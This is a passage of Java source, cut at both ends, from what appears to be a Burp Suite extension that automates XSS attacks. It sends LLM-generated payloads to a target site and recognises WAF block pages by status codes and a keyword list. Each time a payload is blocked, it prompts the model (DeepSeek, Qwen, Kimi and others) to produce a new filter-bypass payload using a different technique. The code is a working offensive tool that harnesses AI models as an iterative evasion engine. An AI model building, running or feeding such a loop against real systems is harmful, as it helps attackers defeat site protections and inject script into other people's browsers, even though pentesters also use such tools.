        if (responseText == null) {
            return false;
        }
        String lowerText = responseText.toLowerCase();
        return lowerText.contains("waf") || lowerText.contains("被拦截") ||
                lowerText.contains("安全狗") || lowerText.contains("雷池") ||
                lowerText.contains("防火墙拦截") || lowerText.contains("造成威胁") ||
                lowerText.contains("攻击行为") || lowerText.contains("反馈误报") ||
                lowerText.contains("黑客攻击") || lowerText.contains("危险内容") ||
                lowerText.contains("不合法") || lowerText.contains("拦截") ||
                lowerText.contains("宝塔") || lowerText.contains("创宇盾");
    }

    // 新增：处理请求提取失败的方法
    private void handleRequestExtractionFailure(AISessionState sessionState, String errorMessage) {
        logToUI("Error: " + errorMessage);
        logToConsole(errorMessage);

// 在UI线程中更新UI状态
        SwingUtilities.invokeLater(() -> {

// 提示用户修复请求
            String message = errorMessage + "\n,AI卡死报错，点击停止分析，点击清除全部记录，重新开始！！！'\n";
            JOptionPane.showMessageDialog(
                    mainPanel,
                    message,
                    "得,AI被你搞坏了吧",
                    JOptionPane.WARNING_MESSAGE
            );

// 显示AI分析和当前请求，以便用户可以编辑
            aiResponseTextArea.setText(sessionState.getLastAIResponse());
            requestTextArea.setText(""); // 清空请求框，等待用户输入新请求
        });
    }

    // 新增：使用手动修复的请求继续AI会话
    private void continuteAISessionWithFixedRequest(AISessionState sessionState) {
        if (!isRunning || !sessionState.isWaitingForManualFix()) {
            return;
        }

// 使用手动修复的请求
        String fixedRequest = sessionState.getManualFixedRequest();
        if (fixedRequest == null || fixedRequest.isEmpty()) {
            logToUI("错误:未提供固定请求");
            return;
        }

// 重置状态
        sessionState.setWaitingForManualFix(false);
        sessionState.setManualFixedRequest(null);

        try {
// 处理修复后的请求
            processValidRequest(fixedRequest, sessionState);

// 为下一轮迭代添加延迟
            Thread.sleep(1000);

// 继续下一次迭代
            processAIIteration(sessionState);

        } catch (Exception e) {
            String errorMessage = "错误处理固定请求: " + e.getMessage();
            logToUI(errorMessage);
            logToConsole(errorMessage);
            e.printStackTrace(stderr);

// 恢复UI状态
            SwingUtilities.invokeLater(() -> {
                isRunning = false;
                sendToAIButton.setEnabled(true);
                stopButton.setEnabled(false);
                logToUI("AI会话因错误而停止");
            });
        }
    }

    // 新增：处理有效请求的方法
    private void processValidRequest(String validRequest, AISessionState sessionState) throws Exception {
// 使用HTTP请求的字节形式
        byte[] requestBytes = validRequest.getBytes(StandardCharsets.UTF_8);

        logToUI("向目标发送经过验证的请求: " +
                currentHttpService.getHost() + ":" +
                currentHttpService.getPort());

// 使用Burp的IHttpService发送请求
        IHttpRequestResponse httpRequestResponse = null;
        try {
// 使用Burp的IRequestInfo分析请求以确保格式正确
            IRequestInfo requestInfo = helpers.analyzeRequest(requestBytes);
            if (requestInfo.getMethod() == null || requestInfo.getUrl() == null) {
                throw new Exception("无效的请求格式：缺少方法或URL");
            }

            httpRequestResponse = callbacks.makeHttpRequest(
                    currentHttpService,
                    requestBytes);
        } catch (Exception e) {
            logToUI("发送请求错误: " + e.getMessage());

// 尝试使用紧急修复
            String fixedRequest = tryToFixHttpRequestFormat(validRequest);
            if (fixedRequest != null) {
                logToUI("尝试使用紧急固定请求格式");
                requestBytes = fixedRequest.getBytes(StandardCharsets.UTF_8);

                try {
                    httpRequestResponse = callbacks.makeHttpRequest(
                            currentHttpService,
                            requestBytes);

// 更新提取的请求为修复后的请求
                    validRequest = fixedRequest;
                } catch (Exception ex) {
                    logToUI("发送固定请求错误: " + ex.getMessage());
                    throw ex; // 重新抛出异常以终止当前迭代
                }
            } else {
                throw e; // 如果无法修复，重新抛出原始异常
            }
        }

        //检查响应
        if (httpRequestResponse == null || httpRequestResponse.getResponse() == null) {
            throw new Exception("未收到目标响应");
        }

// 从IHttpRequestResponse获取响应数据
        byte[] responseBytes = httpRequestResponse.getResponse();

        String responseText = new String(responseBytes, StandardCharsets.UTF_8);
        IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
        logToUI("收到目标的响应 (Status: " + responseInfo.getStatusCode() + ")");

// 新增判断：如果状态码为403等且响应文本中含有 WAF 拦截关键词，则只向 AI 发送简化信息
        int status = responseInfo.getStatusCode();
        if (status == 403 || status == 400 || status == 502 || status == 500 || isWafIntercepted(responseText)) {
            // 构造简化的用户消息，告知 AI 上一轮 payload 被拦截
            String simplifiedUserContent = "HTTP Response: " + status +
                    "已经判断为被WAF拦截，请你重新生成payload尝试绕过waf，严格遵守开始的规则提示词，此外下次生成payload使用其他绕过思路，不要和上次payload使用相同的手法";
            JSONObject simplifiedUserMessage = new JSONObject();
            simplifiedUserMessage.put("role", "user");
            simplifiedUserMessage.put("content", simplifiedUserContent);
            messageHistory.add(simplifiedUserMessage);
            logToUI("检测到状态码 " + status + " 或关键词匹配，向 AI 发送简化信息以生成新的 payload。");
        } else {
            // 正常情况：提交完整的请求和响应信息
            // 构造下一次对话的用户消息时，对请求和响应内容进行截断
            String nextUserContent = "Modified HTTP Request:\n\n"
                    + truncateContent(validRequest, 3000)
                    + "\n\nHTTP Response:\n\n"
                    + truncateContent(responseText, 3000);
            JSONObject nextUserMessage = new JSONObject();
            nextUserMessage.put("role", "user");
            nextUserMessage.put("content", nextUserContent);

// 裁剪历史再添加新消息
            trimMessageHistory();
            messageHistory.add(nextUserMessage);
        }

// 更新UI上的请求/响应文本区域
        final String finalRequest = validRequest;
        final String finalResponseText = responseText;
        SwingUtilities.invokeLater(() -> {
            requestTextArea.setText(finalRequest);
            responseTextArea.setText(finalResponseText);
        });

// 添加测试结果到历史记录 - 使用"等待AI分析"作为初始AI回复
        RequestResponseAIPair testPair = new RequestResponseAIPair(
                requestBytes,
                responseBytes,
                "等待AI分析...",
                history.size() + 1
        );

// 保存这个测试对的ID以便更新
        int testPairId = testPair.getId();
        sessionState.setLastTestPairId(testPairId);

// 添加到历史记录
        history.add(testPair);
// 存储测试对ID到历史索引的映射
        testPairIdToHistoryIndex.put(testPairId, history.size() - 1);

        SwingUtilities.invokeLater(() -> {
            historyTableModel.fireTableDataChanged();
            if (!history.isEmpty()) {
                historyTable.setRowSelectionInterval(history.size() - 1, history.size() - 1);
            }
        });

// Prepare next user message
        String nextUserContent = "Modified HTTP Request:\n\n" + validRequest +
                "\n\nHTTP Response:\n\n" + responseText;

// Add user message to history
        JSONObject nextUserMessage = new JSONObject();
        nextUserMessage.put("role", "user");
        nextUserMessage.put("content", nextUserContent);

// 使用滑动窗口管理对话历史
        if (messageHistory.size() > (MAX_HISTORY * 2)) {
            List<JSONObject> tempHistory = new ArrayList<>();

// 总是保留系统消息
            tempHistory.add(messageHistory.get(0));

// 保留最近的MAX_HISTORY-1对对话，为新的对话预留空间
            int startIdx = messageHistory.size() - (MAX_HISTORY - 1) * 2;
            for (int i = startIdx; i < messageHistory.size(); i++) {
                tempHistory.add(messageHistory.get(i));
            }

// 添加新的用户消息
            tempHistory.add(nextUserMessage);

// 更新消息历史
            messageHistory = tempHistory;
        } else {
// 还没达到最大历史长度，直接添加
            messageHistory.add(nextUserMessage);
        }

        logToConsole("更新了下一次迭代的对话，历史大小: " + messageHistory.size());
    }

    private void stopAISession() {
        logToUI("停止AI会话...");
        isRunning = false;
        SwingUtilities.invokeLater(() -> {
            sendToAIButton.setEnabled(true);
            stopButton.setEnabled(false);
        });
    }

    private void logToConsole(String message) {
        stdout.println("[Chypass_Pro] " + message);
    }

    private void logToUI(String message) {
        SwingUtilities.invokeLater(() -> {
            logTextArea.append("[" + new java.util.Date() + "] " + message + "\n");
            logTextArea.setCaretPosition(logTextArea.getDocument().getLength());
        });
    }

    private String sendToDeepSeekAI() throws IOException {
        logToConsole("Preparing to send request to DeepSeek API");
        URL url = new URL("https://api.deepseek.com/v1/chat/completions");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Authorization", "Bearer " + apiKey);
        connection.setDoOutput(true);

// 设置较长的超时时间
        connection.setConnectTimeout(30000); // 30秒连接超时
        connection.setReadTimeout(60000); // 60秒读取超时

        JSONObject json = new JSONObject();
        json.put("model", "deepseek-chat");

        // 将消息历史转换为JSONArray
        JSONArray messagesArray = new JSONArray();
        for (JSONObject message : messageHistory) {
            messagesArray.put(message);
        }

        json.put("messages", messagesArray);
        json.put("temperature", 0.3);

        String jsonBody = json.toString();
        logToConsole("Sending JSON to DeepSeek: " + jsonBody);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        StringBuilder response = new StringBuilder();
        try (java.util.Scanner scanner = new java.util.Scanner(connection.getInputStream(), StandardCharsets.UTF_8.name())) {
            while (scanner.hasNextLine()) {
                response.append(scanner.nextLine());
                response.append("\n");
            }
        }

        String responseStr = response.toString();
        logToConsole("收到来自DeepSeek的原始响应: " + responseStr);
        JSONObject responseJson;
        try {
            responseJson = new JSONObject(responseStr);
        } catch (Exception ex) {
            logToUI("返回的不是合法JSON，可能是由于请求历史过长导致截断或错误。请检查历史记录是否过大，并尝试清理部分历史。");
            logToConsole("异常信息：" + ex.getMessage());
            return "Error: 响应异常，可能是上下文超限";
        }

        String aiResponse = responseJson.getJSONArray("choices")
                .getJSONObject(0)
                .getJSONObject("message")
                .getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
        updatePendingAnalysisIfNeeded(aiResponse);

        return aiResponse;

    }

    // 新增：如果存在等待分析的记录，则更新它
    private void updatePendingAnalysisIfNeeded(String aiResponse) {
        // 检查历史记录中是否有待更新的测试对
        for (int i = history.size() - 2; i >= 0; i--) {
            RequestResponseAIPair pair = history.get(i);
            if (pair.getAiResponse().equals("等待AI分析...")) {
                // 找到待更新的记录，用新的AI分析更新它
                logToConsole("更新索引处以前的“等待分析”记录 " + i);
                pair.setAiResponse(aiResponse);

                // 通知表格模型数据已更新
                final int finalIndex = i;
                SwingUtilities.invokeLater(() -> {
                    historyTableModel.fireTableRowsUpdated(finalIndex, finalIndex);
                });

                // 只更新最近的一条
                break;
            }
        }
    }

    private String sendToSiliconFlowAI() throws IOException {
        logToConsole("Preparing to send request to SiliconFlow API");
        URL url = new URL("https://api.siliconflow.cn/v1/chat/completions");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Authorization", "Bearer " + apiKey);
        connection.setDoOutput(true);

// 设置较长的超时时间
        connection.setConnectTimeout(30000); // 30秒连接超时
        connection.setReadTimeout(60000); // 60秒读取超时

        JSONObject json = new JSONObject();
        String modelName = modelNameField.getText().trim();
        if (modelName.isEmpty()) {
            modelName = "ft:";
        }
        json.put("model", modelName);
        JSONArray messagesArray = new JSONArray();
        String systemContent = "";
        if (!messageHistory.isEmpty() && "system".equals(messageHistory.get(0).getString("role"))) {
            systemContent = messageHistory.get(0).getString("content") + "\n\n";
        }


        for (int i = 1; i < messageHistory.size(); i++) {
            JSONObject message = messageHistory.get(i);
            if (i == 1 && "user".equals(message.getString("role"))) {
                JSONObject modifiedMessage = new JSONObject();
                modifiedMessage.put("role", "user");
                modifiedMessage.put("content", systemContent + message.getString("content"));
                messagesArray.put(modifiedMessage);
            } else {
                messagesArray.put(message);
            }
        }

        json.put("messages", messagesArray);
        json.put("temperature", 0.3);
        json.put("max_tokens", 4096);

        String jsonBody = json.toString();
        logToConsole("向SiliconFlow发送JSON: " + jsonBody);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        StringBuilder response = new StringBuilder();
        try (java.util.Scanner scanner = new java.util.Scanner(connection.getInputStream(), StandardCharsets.UTF_8.name())) {
            while (scanner.hasNextLine()) {
                response.append(scanner.nextLine());
                response.append("\n");
            }
        }

        String responseStr = response.toString();
        logToConsole("收到来自SiliconFlow的原始响应: " + responseStr);

        JSONObject responseJson = new JSONObject(responseStr);
        String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
        updatePendingAnalysisIfNeeded(aiResponse);

        return aiResponse;
    }

    private String sendToQwenAI() throws IOException {
        logToConsole("准备向Qwen AI发送请求");
        URL url = new URL("https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Authorization", "Bearer " + apiKey);
        connection.setDoOutput(true);

// 设置较长的超时时间
        connection.setConnectTimeout(30000); // 30秒连接超时
        connection.setReadTimeout(60000); // 60秒读取超时

        JSONObject json = new JSONObject();
        String modelName = modelNameField.getText().trim();
        if (modelName.isEmpty()) {
            modelName = "qwen-plus";
        }
        json.put("model", modelName);
        JSONArray messagesArray = new JSONArray();

        for (JSONObject message : messageHistory) {
            messagesArray.put(message);
        }

        json.put("messages", messagesArray);
        json.put("temperature", 0.3);
        json.put("max_tokens", 4096);

        String jsonBody = json.toString();
        logToConsole("Sending JSON to Qwen AI: " + jsonBody);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        StringBuilder response = new StringBuilder();
        try (java.util.Scanner scanner = new java.util.Scanner(connection.getInputStream(), StandardCharsets.UTF_8.name())) {
            while (scanner.hasNextLine()) {
                response.append(scanner.nextLine());
                response.append("\n");
            }
        }

        String responseStr = response.toString();
        logToConsole("收到Qwen AI的原始响应: " + responseStr);

        JSONObject responseJson = new JSONObject(responseStr);
        String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
        updatePendingAnalysisIfNeeded(aiResponse);

        return aiResponse;
    }

    private String sendToKimiAI() throws IOException, InterruptedException {
        logToConsole("准备向Kimi AI发送请求");

// 对Kimi API增加额外延迟以避免429错误
        logToUI("在Kimi API请求之前添加延迟以避免速率限制...");
        Thread.sleep(2000); // 增加2秒延迟

        URL url = new URL("https://api.moonshot.cn/v1/chat/completions");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("Authorization", "Bearer " + apiKey);
        connection.setDoOutput(true);

// 设置较长的超时时间
        connection.setConnectTimeout(30000); // 30秒连接超时
        connection.setReadTimeout(60000); // 60秒读取超时

        JSONObject json = new JSONObject();
        String modelName = modelNameField.getText().trim();
        if (modelName.isEmpty()) {
            modelName = "moonshot-v1-8k";
        }
        json.put("model", modelName);

// 为Kimi重新构建消息历史 - 修复400错误问题
        JSONArray messagesArray = new JSONArray();

// 添加系统消息
        if (!messageHistory.isEmpty() && "system".equals(messageHistory.get(0).getString("role"))) {
            messagesArray.put(messageHistory.get(0));
        }

// 只添加user和assistant消息，不含其他角色
        for (int i = 1; i < messageHistory.size(); i++) {
            JSONObject message = messageHistory.get(i);
            String role = message.getString("role");

// Kimi可能只接受标准角色: system, user, assistant
            if ("user".equals(role) || "assistant".equals(role)) {
// 创建新的消息对象，只包含role和content字段
                JSONObject cleanMessage = new JSONObject();
                cleanMessage.put("role", role);
                cleanMessage.put("content", message.getString("content"));
                messagesArray.put(cleanMessage);
            }
        }

        json.put("messages", messagesArray);
        json.put("temperature", 0.3);

// Kimi可能不支持其他非标准参数，确保JSON简洁

        String jsonBody = json.toString();
        logToConsole("向Kimi发送JSON: " + jsonBody);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

// 检查响应码
        int responseCode = connection.getResponseCode();
        if (responseCode == 429) {
            logToUI("收到429太多来自Kimi API的请求。这将由重试机制来处理.");
            throw new IOException("429 Too Many Requests");
        } else if (responseCode == 400) {
// 记录错误详情以便调试
            StringBuilder errorResponse = new StringBuilder();
            try (java.util.Scanner scanner = new java.util.Scanner(connection.getErrorStream(), StandardCharsets.UTF_8.name())) {
                while (scanner.hasNextLine()) {
                    errorResponse.append(scanner.nextLine());
                    errorResponse.append("\n");
                }
            }
            logToConsole("Received 400 Bad Request from Kimi API. Error details: " + errorResponse.toString());

// 如果是第二次请求或更多，尝试使用简化的消息历史
            if (messageHistory.size() > 3) { // 有系统消息+至少一对对话
                logToUI("Trying simplified message history for Kimi API...");

// 创建极简历史: 只保留系统消息和最后一条用户消息
                JSONArray simplifiedMessages = new JSONArray();

// 添加系统消息
                if (!messageHistory.isEmpty() && "system".equals(messageHistory.get(0).getString("role"))) {
                    JSONObject sysMsg = new JSONObject();
                    sysMsg.put("role", "system");
                    sysMsg.put("content", messageHistory.get(0).getString("content"));
                    simplifiedMessages.put(sysMsg);
                }

// 查找最后一条用户消息
                for (int i = messageHistory.size() - 1; i >= 0; i--) {
                    if ("user".equals(messageHistory.get(i).getString("role"))) {
                        JSONObject userMsg = new JSONObject();
                        userMsg.put("role", "user");
                        userMsg.put("content", messageHistory.get(i).getString("content"));
                        simplifiedMessages.put(userMsg);
                        break;
                    }
                }

// 更新请求JSON
                json.put("messages", simplifiedMessages);
                jsonBody = json.toString();
                logToConsole("Retrying with simplified messages: " + jsonBody);

// 重新发送请求
                HttpURLConnection retryConnection = (HttpURLConnection) url.openConnection();
                retryConnection.setRequestMethod("POST");
                retryConnection.setRequestProperty("Content-Type", "application/json");
                retryConnection.setRequestProperty("Authorization", "Bearer " + apiKey);
                retryConnection.setDoOutput(true);
                retryConnection.setConnectTimeout(30000);
                retryConnection.setReadTimeout(60000);

                try (OutputStream os = retryConnection.getOutputStream()) {
                    byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

// 检查重试响应
                if (retryConnection.getResponseCode() == 200) {
                    StringBuilder response = new StringBuilder();
                    try (java.util.Scanner scanner = new java.util.Scanner(retryConnection.getInputStream(), StandardCharsets.UTF_8.name())) {
                        while (scanner.hasNextLine()) {
                            response.append(scanner.nextLine());
                            response.append("\n");
                        }
                    }

                    String responseStr = response.toString();
                    logToConsole("Simplified request succeeded. Response: " + responseStr);

                    JSONObject responseJson = new JSONObject(responseStr);
                    String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
                    updatePendingAnalysisIfNeeded(aiResponse);

                    return aiResponse;
                } else {
// 如果简化请求还是失败，抛出更详细的异常
                    throw new IOException("Failed with both normal and simplified requests. Status: " + retryConnection.getResponseCode());
                }
            } else {
                throw new IOException("Bad Request (400): " + errorResponse.toString());
            }
        }

// 处理成功响应
        StringBuilder response = new StringBuilder();
        try (java.util.Scanner scanner = new java.util.Scanner(connection.getInputStream(), StandardCharsets.UTF_8.name())) {
            while (scanner.hasNextLine()) {
                response.append(scanner.nextLine());
                response.append("\n");
            }
        }

        String responseStr = response.toString();
        logToConsole("Received raw response from Kimi: " + responseStr);

        JSONObject responseJson = new JSONObject(responseStr);
        String aiResponse = responseJson.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content");

// 检查是否需要更新之前的"等待AI分析"记录
        updatePendingAnalysisIfNeeded(aiResponse);

        return aiResponse;
    }

    // 添加指数退避重试机制
    private String sendToKimiAIWithRetry(int retryCount) throws IOException, InterruptedException {
        if (retryCount > 3) { // 最多重试3次
            throw new IOException("Exceeded maximum retry attempts for Kimi API");
        }

        try {
// 指数退避延迟
            int waitTime = 2000 * (int) Math.pow(2, retryCount);
            if (retryCount > 0) {
                logToUI("Retry attempt " + retryCount + " for Kimi API, waiting " + (waitTime / 1000) + " seconds...");
                Thread.sleep(waitTime);
            }

            return sendToKimiAI();
        } catch (IOException e) {
            if (e.getMessage().contains("429")) {
                logToUI("Received 429 Too Many Requests from Kimi API, will retry with longer delay");
                return sendToKimiAIWithRetry(retryCount + 1);
            } else {
                throw e; // 其他IO异常直接抛出
            }
        }
    }

    /*private String extractRequestFromAIResponse(String aiResponse) {
        logToConsole("Extracting request from AI response");

// 查找代码块格式的请求
        int startIndex = aiResponse.indexOf("```http");
        if (startIndex == -1) {
            startIndex = aiResponse.indexOf("```HTTP");
        }

        if (startIndex != -1) {
// 找到代码块开始位置
            startIndex = aiResponse.indexOf("\n", startIndex);
            if (startIndex != -1) {
                startIndex += 1;

// 查找代码块结束位置
                int endIndex = aiResponse.indexOf("```", startIndex);
                if (endIndex != -1) {
                    String extractedRequest = aiResponse.substring(startIndex, endIndex).trim();
                    logToConsole("Extracted request from code block");
                    return extractedRequest;
                }
            }
        }

// 如果没有找到代码块，尝试直接提取HTTP请求
        logToConsole("No code block markers found, looking for HTTP request patterns");

// 寻找常见HTTP方法开头的行
        String[] lines = aiResponse.split("\n");
        StringBuilder requestBuilder = new StringBuilder();
        boolean foundRequestLine = false;
        boolean inHeaders = false;
        boolean inBody = false;

        for (String line : lines) {
            line = line.trim();

// 查找请求行
            if (!foundRequestLine && (line.startsWith("GET ") ||
                    line.startsWith("POST ") ||
                    line.startsWith("PUT ") ||
                    line.startsWith("DELETE ") ||
                    line.startsWith("HEAD ") ||
                    line.startsWith("OPTIONS "))) {

                foundRequestLine = true;
                inHeaders = true;
                requestBuilder.append(line).append("\n");
                continue;
            }

// 如果找到了请求行，开始收集头部和请求体
            if (foundRequestLine) {
                if (inHeaders) {
                    if (line.isEmpty()) {
// 空行表示头部结束，请求体开始
                        inHeaders = false;
                        inBody = true;
                        requestBuilder.append("\n"); // 添加空行
                    } else {
// 继续收集头部
                        requestBuilder.append(line).append("\n");
                    }
                } else if (inBody) {
// 收集请求体
                    requestBuilder.append(line).append("\n");
                }
            }
        }

        if (foundRequestLine) {
            String extractedRequest = requestBuilder.toString().trim();
            logToConsole("Extracted request from text content");
            return extractedRequest;
        }

// 如果还是没找到合适的请求，返回错误
        logToConsole("No valid HTTP request found in AI response");
        return null;
    }*/
    /**
     * 将模板请求中的 <xss> 替换为 AI 给的 payload
     */
    private String buildFinalRequest(String requestTemplate, String payload) {
        if (requestTemplate == null || requestTemplate.isEmpty()) {
            logToConsole("Warning: requestTemplate 为空");
            return null;
        }
        if (!requestTemplate.contains("<xss>")) {
            logToConsole("Warning: 模板中未找到 <xss> 占位符");
        }
        // 使用正则表达式进行替换，(?i)表示忽略大小写
        String finalRequest = requestTemplate.replaceAll("(?i)\\Q<xss>\\E", Matcher.quoteReplacement(payload));
        logToConsole("最终请求内容:\n" + finalRequest);
        return finalRequest;
    }
    //从 AI 响应中提取出 payload 字符串

    private String extractPayloadFromAIResponse(String aiResponse) {
        if (aiResponse == null || aiResponse.trim().isEmpty()) {
            return null;
        }
        String lowerResp = aiResponse.toLowerCase();

        // 查找 "bypass_payload:" 或 "本轮payload:"
        int idxBypass = lowerResp.indexOf("bypass_payload:");
        int idxBenlun = lowerResp.indexOf("下一轮payload:");

        // 优先判断 bypass_payload
        if (idxBypass != -1) {
            return parsePayload(aiResponse, idxBypass + "bypass_payload:".length());
        } else if (idxBenlun != -1) {
            return parsePayload(aiResponse, idxBenlun + "下一轮payload:".length());
        }

        // 如果都没找到，就返回 null
        return null;
    }
    private void sendCurrentRequestToRepeater() {
        try {
            // 从文本框获取请求字符串
            String requestString = requestTextArea.getText();
            if (requestString == null || requestString.trim().isEmpty()) {
                logToUI("没有可发送到 Repeater 的请求");
                return;
            }

            // 转成字节数组（用 UTF-8 编码）
            byte[] requestBytes = requestString.getBytes(StandardCharsets.UTF_8);

            // 从当前扩展中拿到 httpService 信息
            if (currentHttpService == null) {
                logToUI("缺少 HTTP Service 信息，无法发送到 Repeater");
                return;
            }

            // 获取 host/port/protocol
            String host = currentHttpService.getHost();
            int port = currentHttpService.getPort();
            boolean isSsl = "https".equalsIgnoreCase(currentHttpService.getProtocol());

            // 调用 Burp 提供的 sendToRepeater 方法
            callbacks.sendToRepeater(host, port, isSsl, requestBytes, "xss");
            logToUI("已将请求发送到 Repeater");
        } catch (Exception e) {
            logToUI("发送到 Repeater 失败: " + e.getMessage());
        }
    }

    /**
     * 从指定起始位置开始，读取到下一行或字符串结尾，作为payload
     */
    private String parsePayload(String fullText, int startIndex) {
        // 定义结束标记
        String endMarker = "--payload-end--";
        int endIndex = fullText.indexOf(endMarker, startIndex);
        if (endIndex == -1) {
            // 如果没有找到结束标记，就读取到字符串末尾
            endIndex = fullText.length();
        }
        return fullText.substring(startIndex, endIndex).trim();
    }


        /**
     * 验证和修复HTTP请求格式 - 重构后的方法，确保正确处理HTTP请求格式
     */
    private String validateAndFixRequest(String request) {
        logToConsole("Validating and fixing request format");

        if (request == null || request.trim().isEmpty()) {
            logToConsole("Request is null or empty");
            return null;
        }

        // 检查并规范化行尾
        request = request.replace("\r\n", "\n");

        // 尝试分离请求头和请求体，严格遵循HTTP规范
        String[] sections;
        if (request.contains("\n\n")) {
            sections = request.split("\n\n", 2);
        } else {
            // 如果没有找到空行，假设整个内容都是请求头
            sections = new String[]{request, ""};
            logToConsole("Warning: No empty line found to separate headers and body");
        }

        String headerSection = sections[0];
        String body = sections.length > 1 ? sections[1] : "";

        // 解析请求行和请求头
        String[] headerLines = headerSection.split("\n");
        if (headerLines.length == 0) {
            logToConsole("No header lines found");
            return null;
        }

        // 验证并修复请求行
        String requestLine = headerLines[0];
        if (!requestLine.matches("(GET|POST|PUT|DELETE|HEAD|OPTIONS) .+ HTTP/[0-9]\\.[0-9]")) {
            logToConsole("Invalid request line: " + requestLine);

            // 尝试修复请求行
            if (requestLine.startsWith("GET ") || requestLine.startsWith("POST ") ||
                    requestLine.startsWith("PUT ") || requestLine.startsWith("DELETE ") ||
                    requestLine.startsWith("HEAD ") || requestLine.startsWith("OPTIONS ")) {

                // 如果缺少HTTP版本，添加它
                if (!requestLine.contains(" HTTP/")) {
                    requestLine += " HTTP/1.1";
                    logToConsole("Fixed request line by adding HTTP version: " + requestLine);
                }
            } else {
                return null; // 无法修复的请求行
            }
        }

        // 提取HTTP方法
        String method = requestLine.split(" ")[0];

        // 分析和收集现有的请求头
        boolean hasHost = false;
        boolean hasContentType = false;
        boolean hasContentLength = false;

        // 创建一个键值对来存储并去重请求头
        java.util.Map<String, String> headers = new java.util.LinkedHashMap<>();

        // 添加请求行
        StringBuilder fixedRequest = new StringBuilder(requestLine).append("\r\n");

        // 处理其他请求头
        for (int i = 1; i < headerLines.length; i++) {
            String headerLine = headerLines[i].trim();
            if (headerLine.isEmpty()) continue; // 跳过空行

            if (headerLine.contains(":")) {
                String[] parts = headerLine.split(":", 2);
                String headerName = parts[0].trim();
                String headerValue = parts.length > 1 ? parts[1].trim() : "";

                // 检查重要的请求头
                String headerNameLower = headerName.toLowerCase();
                if (headerNameLower.equals("host")) {
                    hasHost = true;
                } else if (headerNameLower.equals("content-type")) {
                    hasContentType = true;
                } else if (headerNameLower.equals("content-length")) {
                    hasContentLength = true;
                    // 我们将在后面重新计算Content-Length
                    continue;
                }

                // 存储请求头，确保没有重复
                headers.put(headerName, headerValue);
            } else {
                logToConsole("Skipping invalid header: " + headerLine);
            }
        }

        // 如果没有Host请求头，添加一个
        if (!hasHost && currentHttpService != null) {
            String hostValue = currentHttpService.getHost();
            if (currentHttpService.getPort() != 80 && currentHttpService.getPort() != 443) {
                hostValue += ":" + currentHttpService.getPort();
            }
            headers.put("Host", hostValue);
            logToConsole("Added missing Host header: " + hostValue);
        }

        // 对于POST或PUT请求，确保有Content-Type
        if (("POST".equals(method) || "PUT".equals(method)) && body.length() > 0 && !hasContentType) {
            headers.put("Content-Type", "application/x-www-form-urlencoded");
            logToConsole("Added default Content-Type for " + method + " request");
        }

        // 重新计算并添加Content-Length
        if (("POST".equals(method) || "PUT".equals(method)) && body.length() > 0) {
            // 使用UTF-8计算字节长度，这更可能是正确的
            int contentLength = body.getBytes(StandardCharsets.UTF_8).length;
            headers.put("Content-Length", String.valueOf(contentLength));
            logToConsole("Set Content-Length to " + contentLength);
        }

        // 添加所有处理好的请求头
        for (java.util.Map.Entry<String, String> header : headers.entrySet()) {
            fixedRequest.append(header.getKey()).append(": ").append(header.getValue()).append("\r\n");
        }

        // 添加空行，严格使用CRLF
        fixedRequest.append("\r\n");

        // 添加请求体
        if (body.length() > 0) {
            fixedRequest.append(body);
            // 确保请求体不以换行符结束，但如果原始请求体有尾部换行则保留
            if (!body.endsWith("\n") && !body.endsWith("\r\n")) {
                fixedRequest.append("\r\n");
            }
        }

        String finalRequest = fixedRequest.toString();
        logToConsole("Validated and fixed request (length: " + finalRequest.length() + " bytes)");
        return finalRequest;
    }

    /**
     * 紧急修复HTTP请求格式的最后一道防线 - 重构后的方法
     */
    private String tryToFixHttpRequestFormat(String request) {
        logToConsole("Trying emergency HTTP request format fix");

        if (request == null || request.trim().isEmpty()) {
            return null;
        }

        // 规范化换行符
        request = request.replace("\r\n", "\n");

        // 分析请求结构
        String[] lines = request.split("\n");
        if (lines.length == 0) {
            return null;
        }

        StringBuilder fixedRequest = new StringBuilder();

        // 处理请求行
        String requestLine = lines[0];
        if (!(requestLine.startsWith("GET ") || requestLine.startsWith("POST ") ||
                requestLine.startsWith("PUT ") || requestLine.startsWith("DELETE ") ||
                requestLine.startsWith("HEAD ") || requestLine.startsWith("OPTIONS "))) {

            logToConsole("Invalid request line, cannot fix: " + requestLine);
            return null;
        }

        // 确保请求行有HTTP版本
        if (!requestLine.contains(" HTTP/")) {
            requestLine += " HTTP/1.1";
            logToConsole("Added HTTP version to request line");
        }

        fixedRequest.append(requestLine).append("\r\n");

        // 解析HTTP方法
        String method = requestLine.split(" ")[0];

        // 处理请求头和检查必需的头部
        boolean foundEmptyLine = false;
        boolean hasHost = false;
        boolean hasContentType = false;
        boolean hasContentLength = false;
